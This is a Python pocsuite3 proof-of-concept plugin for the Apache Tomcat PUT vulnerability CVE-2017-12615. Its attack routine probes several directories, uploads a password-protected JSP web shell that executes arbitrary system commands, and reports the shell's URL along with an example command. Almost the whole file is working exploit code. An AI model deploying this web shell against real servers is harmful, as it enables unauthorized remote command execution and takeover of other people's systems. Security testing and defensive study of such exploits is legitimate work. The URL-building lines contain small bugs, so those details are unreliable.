# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY,requests
from pocsuite3.lib.core.threads import run_threads
import random


class TomcatCmdExecPOC(POCBase):
    vulID = 'CVE-2017-12615'
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 10, 2020'
    createDate = 'Aug 10, 2020'
    name = 'tomcat命令执行'
    appName = 'tomcat'
    appVersion = 'v1.0.0'
    vulType = '命令执行'
    protocol = 'http'

    scanDirDic = ['/', '/docs', '/examples', '/uploads','/config']
    shellName = 'seven.jsp'
    pwd = 'seven'

    def writeFile(self,url,fileStr, path):
        try:
            
            shellURL = url + path
            resp = requests.options(shellURL+'/', timeout=10)
            if 'allow' in resp.headers and resp.headers['allow'].find('PUT') > 0:
                requests.put(shellURL+'/', fileStr)
                getResp = requests.get(shellURL)
                if getResp.status_code != 404 and getResp.status_code != 500 and getResp.content:
                    return True
        except Exception as e:
            # logger.info(e)
            pass
        return False

    def _attack(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = self.url + 'http://'
        bodyRaw = """
    <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
    <%
    if("{0}".equals(request.getParameter("pwd"))){{
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){{
            out.println(new String(b));
        }}
        out.print("</pre>");
    }}
    %>
    """.format(self.pwd)
        for path in self.scanDirDic:
            path = path + '/'+self.shellName
            if self.writeFile(url,bodyRaw, path):
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = (self.url+path).replace('//','/')
                result['extra'] = {}
                result['extra']['pwd'] = self.pwd
                result['extra']['example'] = '{0}?pwd={1}&i=ls'.format(result['ShellInfo']['URL'],self.pwd)
                return self.parse_output(result)
        return self.parse_output(result)

    def _verify(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = self.url + 'http://'
        randNum = random.randint(100000, 900000)
        bodyRaw = """
    <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
    <%out.println({0});%>
    """.format(str(randNum))
        for path in self.scanDirDic:
            path = path + '/'+self.shellName
            if self.writeFile(url,bodyRaw, path):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = (self.url+path).replace('//','/')
                return self.parse_output(result)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(TomcatCmdExecPOC)